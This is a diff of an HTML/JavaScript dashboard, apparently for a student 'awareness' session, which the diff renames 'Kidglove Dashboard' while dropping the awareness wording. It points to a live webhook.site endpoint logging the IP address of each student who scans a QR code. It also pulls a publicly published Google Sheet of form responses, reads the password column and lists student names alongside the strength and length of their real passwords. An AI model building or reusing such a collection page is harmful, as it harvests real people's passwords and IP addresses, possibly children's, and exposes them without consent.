@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cybersecurity Awareness Dashboard - LIVE DATA</title>
+    <title>Kidglove Dashboard - LIVE DATA</title>
     <style>
         * {
             margin: 0;
@@ -35,11 +35,6 @@
         .header h1 {
             font-size: 28px;
             margin-bottom: 10px;
-        }
-
-        .header p {
-            font-size: 14px;
-            opacity: 0.9;
         }
 
         .stats-grid {
@@ -91,40 +86,12 @@
             border-bottom: 2px solid #667eea;
             font-weight: bold;
             font-size: 16px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
         }
 
         .panel-content {
             padding: 20px;
-            max-height: 500px;
+            max-height: 400px;
             overflow-y: auto;
-        }
-
-        .ip-item {
-            padding: 12px;
-            border-bottom: 1px solid #eee;
-            font-size: 13px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .ip-item:last-child {
-            border-bottom: none;
-        }
-
-        .ip-address {
-            font-family: monospace;
-            font-weight: bold;
-            color: #667eea;
-        }
-
-        .ip-location {
-            color: #666;
-            margin-left: 15px;
-            font-size: 12px;
         }
 
         .password-item {
@@ -151,11 +118,6 @@
             color: #721c24;
         }
 
-        .strength-medium {
-            background: #fff3cd;
-            color: #856404;
-        }
-
         .strength-strong {
             background: #d4edda;
             color: #155724;
@@ -177,24 +139,11 @@
             cursor: pointer;
             font-weight: bold;
             font-size: 14px;
+            margin-top: 20px;
         }
 
         .refresh-btn:hover {
             background: #764ba2;
-        }
-
-        .full-width {
-            grid-column: 1 / -1;
-        }
-
-        .warning-banner {
-            background: #fff3cd;
-            border: 1px solid #ffc107;
-            color: #856404;
-            padding: 15px;
-            border-radius: 5px;
-            margin-bottom: 20px;
-            font-size: 13px;
         }
 
         .chart-container {
@@ -241,6 +190,25 @@
             font-weight: bold;
         }
 
+        .full-width {
+            grid-column: 1 / -1;
+        }
+
+        .webhook-link {
+            display: inline-block;
+            margin-top: 15px;
+            padding: 10px 20px;
+            background: #667eea;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            font-size: 13px;
+        }
+
+        .webhook-link:hover {
+            background: #764ba2;
+        }
+
         @media (max-width: 900px) {
             .content-grid {
                 grid-template-columns: 1fr;
@@ -251,19 +219,14 @@
 <body>
     <div class="container">
         <div class="header">
-            <h1>🎓 Cybersecurity Awareness Session Dashboard - LIVE DATA</h1>
-            <p>Real-time tracking of student IP addresses and password strength analysis</p>
-        </div>
-
-        <div class="warning-banner">
-            <strong>📊 LIVE DATA MODE:</strong> This dashboard now shows REAL data from webhook.site and Google Forms.
-            <button class="refresh-btn" onclick="loadRealData()" style="margin-left: 10px; float: right;">🔄 Refresh Now</button>
+            <h1>🎓 Kidglove Dashboard - LIVE DATA</h1>
+            <p>Real-time student registration and password strength analysis</p>
         </div>
 
         <div class="stats-grid">
             <div class="stat-card">
-                <h3>Students Logged</h3>
-                <div class="stat-value" id="totalIPs">0</div>
+                <h3>Forms Submitted</h3>
+                <div class="stat-value" id="formsCount">0</div>
             </div>
             <div class="stat-card">
                 <h3>Weak Passwords</h3>
@@ -274,19 +237,27 @@
                 <div class="stat-value" id="strongCount">0</div>
             </div>
             <div class="stat-card">
-                <h3>Forms Submitted</h3>
-                <div class="stat-value" id="formsCount">0</div>
+                <h3>Medium Passwords</h3>
+                <div class="stat-value" id="mediumCount">0</div>
             </div>
         </div>
 
         <div class="content-grid">
             <div class="panel">
                 <div class="panel-header">
-                    📡 Captured IP Addresses (Real Data from webhook.site)
-                    <button class="refresh-btn" onclick="loadIPData()" style="padding: 5px 10px; font-size: 12px;">↻</button>
+                    📡 IP Logging Status
                 </div>
-                <div class="panel-content" id="ipList">
-                    <div class="loading-text">Loading IP data from webhook.site...</div>
+                <div class="panel-content">
+                    <p style="color: #666; font-size: 14px;">✅ <strong>IP logging is ACTIVE</strong></p>
+                    <p style="color: #999; font-size: 12px; margin-top: 10px;">
+                        Every time a student scans the QR code and visits the landing page, their IP address is automatically logged.
+                    </p>
+                    <p style="color: #999; font-size: 12px; margin-top: 10px;">
+                        View all logged IPs at:
+                    </p>
+                    <a href="https://webhook.site/0d369f29-e19c-445c-a521-3d7e6464701c" target="_blank" class="webhook-link">
+                        📍 View All Logged IPs
+                    </a>
                 </div>
             </div>
 
@@ -321,50 +292,18 @@
 
         <div class="panel full-width">
             <div class="panel-header">
-                📝 Instructions for Real Form Data
+                📝 Password Analysis from Form Submissions
             </div>
-            <div class="panel-content">
-                <p style="margin-bottom: 15px;"><strong>To see password analysis from Google Form submissions:</strong></p>
-                <ol style="margin-left: 20px; line-height: 1.8;">
-                    <li>Open your Google Form: <code>https://forms.gle/PapZpYfRkc3Siaow5</code></li>
-                    <li>Click "Responses" tab at the top</li>
-                    <li>Click the Google Sheets icon (⊞) to create a sheet from responses</li>
-                    <li>Make the sheet publicly readable (Share → Anyone with link can view)</li>
-                    <li>Copy the Sheet ID from the URL (the long string between /d/ and /edit)</li>
-                    <li>Click "Update Sheet Link" button below and paste the Sheet ID</li>
-                </ol>
-                <br>
-                <input type="text" id="sheetIdInput" placeholder="Paste Google Sheet ID here" style="width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ddd; border-radius: 5px;">
-                <button onclick="setSheetId()" class="refresh-btn">✅ Update Sheet Link</button>
-                <button onclick="loadPasswordData()" class="refresh-btn" style="margin-left: 10px;">🔄 Refresh Password Data</button>
-                <p style="font-size: 12px; color: #999; margin-top: 10px;">Current Sheet ID: <span id="currentSheetId">Not set yet</span></p>
+            <div class="panel-content" id="passwordList">
+                <div class="loading-text">Loading form responses...</div>
             </div>
+            <button class="refresh-btn" onclick="loadPasswordData()">🔄 Refresh Data</button>
         </div>
     </div>
 
     <script>
-        // Configuration - Kidglove
-        const WEBHOOK_URL = 'https://webhook.site/0d369f29-e19c-445c-a521-3d7e6464701c';
-
-        // Pre-configured Kidglove Sheet ID
-        const PRESET_SHEET_ID = '2PACX-1vR8VdKyOUEAq1kpZ37CoKOaFq3lF46kmMxC-v2SV_7MH8nyVjROPPSSJPlPreOFrR5snmac6C52R_Vq';
-
-        // Load/save Sheet ID in localStorage
-        let SHEET_ID = localStorage.getItem('googleSheetId') || PRESET_SHEET_ID;
-        document.getElementById('currentSheetId').textContent = SHEET_ID ? '✅ Connected to Kidglove Sheet' : 'Not set - see instructions above';
-
-        function setSheetId() {
-            const input = document.getElementById('sheetIdInput').value.trim();
-            if (input) {
-                localStorage.setItem('googleSheetId', input);
-                SHEET_ID = input;
-                document.getElementById('currentSheetId').textContent = input;
-                alert('✅ Sheet ID saved! Now refresh password data.');
-                loadPasswordData();
-            } else {
-                alert('Please paste the Sheet ID');
-            }
-        }
+        // Configuration
+        const SHEET_ID = '2PACX-1vR8VdKyOUEAq1kpZ37CoKOaFq3lF46kmMxC-v2SV_7MH8nyVjROPPSSJPlPreOFrR5snmac6C52R_Vq';
 
         // Password strength checker
         function checkPasswordStrength(password) {
@@ -382,93 +321,53 @@
             return 'strong';
         }
 
-        // Load real IP data from webhook.site
-        async function loadIPData() {
-            try {
-                const response = await fetch(WEBHOOK_URL + '.json');
-                const data = await response.json();
-
-                const requests = data.requests || [];
-                const ipList = document.getElementById('ipList');
-                ipList.innerHTML = '';
-
-                const ips = [];
-                requests.forEach((req, index) => {
-                    if (req && req.headers) {
-                        const ip = req.headers['X-Forwarded-For'] || req.headers['x-forwarded-for'] || req.query_parameters?.ip || 'Unknown';
-                        ips.push({
-                            ip: ip,
-                            timestamp: req.created_at
-                        });
-                    }
-                });
-
-                if (ips.length === 0) {
-                    ipList.innerHTML = '<div class="loading-text">No IP data yet. Waiting for student visits...</div>';
-                } else {
-                    ips.forEach((ipData, idx) => {
-                        const item = document.createElement('div');
-                        item.className = 'ip-item';
-                        item.innerHTML = `
-                            <div>
-                                <span class="ip-address">${ipData.ip || 'N/A'}</span>
-                            </div>
-                            <div class="ip-location">
-                                📍 Visit ${idx + 1}
-                            </div>
-                        `;
-                        ipList.appendChild(item);
-                    });
-                }
-
-                document.getElementById('totalIPs').textContent = ips.length;
-            } catch (error) {
-                console.error('Error loading IP data:', error);
-                document.getElementById('ipList').innerHTML = '<div class="loading-text">Error loading data. Check that webhook.site is accessible.</div>';
-            }
-        }
-
-        // Load real password data from Google Sheets
+        // Load password data from Google Sheets
         async function loadPasswordData() {
-            if (!SHEET_ID) {
-                document.getElementById('weakCount').textContent = '?';
-                document.getElementById('strongCount').textContent = '?';
-                document.getElementById('formsCount').textContent = '?';
-                return;
-            }
-
             try {
-                // Google Sheets API - fetch CSV data
-                const sheetUrl = `https://docs.google.com/spreadsheets/d/${SHEET_ID}/export?format=csv`;
+                // Google Sheets CSV export URL for published sheets
+                const sheetUrl = `https://docs.google.com/spreadsheets/d/e/${SHEET_ID}/pub?output=csv`;
+                console.log('Fetching from:', sheetUrl);
+
                 const response = await fetch(sheetUrl);
+                if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
+
                 const csv = await response.text();
+                console.log('CSV received, parsing...');
 
                 const lines = csv.split('\n').filter(line => line.trim());
 
                 if (lines.length <= 1) {
+                    document.getElementById('passwordList').innerHTML = '<div class="loading-text">No form responses yet. Waiting for student submissions...</div>';
                     document.getElementById('formsCount').textContent = '0';
                     return;
                 }
 
-                // Find password column (usually column 7 or 'Password')
-                const headers = lines[0].split(',');
-                const passwordColIndex = headers.findIndex(h => h.toLowerCase().includes('password'));
+                // Parse headers
+                const headers = lines[0].split(',').map(h => h.trim().toLowerCase());
+                console.log('Headers:', headers);
+
+                // Find password column
+                const passwordColIndex = headers.findIndex(h => h.includes('password'));
+                const nameColIndex = headers.findIndex(h => h.includes('name') && !h.includes('father'));
 
                 if (passwordColIndex === -1) {
-                    console.log('Password column not found');
+                    document.getElementById('passwordList').innerHTML = '<div class="loading-text">Password column not found in form</div>';
                     return;
                 }
 
+                // Parse data
                 let weak = 0, medium = 0, strong = 0;
                 const passwords = [];
 
                 for (let i = 1; i < lines.length; i++) {
                     const cols = lines[i].split(',');
                     if (cols[passwordColIndex]) {
-                        const pwd = cols[passwordColIndex].trim().replace(/"/g, '');
+                        const pwd = cols[passwordColIndex].trim().replace(/"/g, '').replace(/^'|'$/g, '');
+                        const name = nameColIndex >= 0 ? cols[nameColIndex].trim().replace(/"/g, '').replace(/^'|'$/g, '') : `Student ${i}`;
+
                         if (pwd) {
                             const strength = checkPasswordStrength(pwd);
-                            passwords.push({ pwd, strength });
+                            passwords.push({ name, pwd, strength });
 
                             if (strength === 'weak') weak++;
                             else if (strength === 'medium') medium++;
@@ -477,9 +376,37 @@
                     }
                 }
 
-                document.getElementById('weakCount').textContent = weak;
-                document.getElementById('strongCount').textContent = strong;
+                // Update UI
                 document.getElementById('formsCount').textContent = passwords.length;
+                document.getElementById('weakCount').textContent = weak;
+                document.getElementById('mediumCount').textContent = medium;
+                document.getElementById('strongCount').textContent = strong;
+
+                // Display passwords
+                const passwordList = document.getElementById('passwordList');
+                passwordList.innerHTML = '';
+
+                if (passwords.length === 0) {
+                    passwordList.innerHTML = '<div class="loading-text">No passwords to analyze yet</div>';
+                } else {
+                    passwords.forEach(p => {
+                        const item = document.createElement('div');
+                        item.className = 'password-item';
+
+                        let strengthClass = p.strength === 'weak' ? 'strength-weak' :
+                                           p.strength === 'medium' ? 'strength-medium' : 'strength-strong';
+                        let strengthText = p.strength.toUpperCase();
+
+                        item.innerHTML = `
+                            <strong>${p.name}</strong>
+                            <span class="password-strength ${strengthClass}" style="background: ${p.strength === 'weak' ? '#f8d7da' : p.strength === 'medium' ? '#fff3cd' : '#d4edda'}; color: ${p.strength === 'weak' ? '#721c24' : p.strength === 'medium' ? '#856404' : '#155724'};">${strengthText}</span>
+                            <div style="font-size: 11px; color: #999; margin-top: 5px;">
+                                Length: ${p.pwd.length} chars
+                            </div>
+                        `;
+                        passwordList.appendChild(item);
+                    });
+                }
 
                 // Update chart
                 const maxValue = Math.max(weak, medium, strong) || 1;
@@ -490,22 +417,18 @@
                 document.getElementById('strongBar').style.height = (strong / maxValue * 100) + '%';
                 document.getElementById('strongBar').textContent = strong;
 
+                console.log('✅ Dashboard updated:', { weak, medium, strong, total: passwords.length });
+
             } catch (error) {
                 console.error('Error loading password data:', error);
+                document.getElementById('passwordList').innerHTML = `<div class="loading-text">Error: ${error.message}<br><small>Make sure Google Sheet is publicly shared</small></div>`;
             }
         }
 
-        // Load all data
-        async function loadRealData() {
-            await loadIPData();
-            await loadPasswordData();
-        }
-
-        // Initial load
+        // Auto-refresh every 5 seconds
         window.addEventListener('load', () => {
-            loadRealData();
-            // Auto-refresh every 5 seconds
-            setInterval(loadRealData, 5000);
+            loadPasswordData();
+            setInterval(loadPasswordData, 5000);
         });
     </script>
 </body>
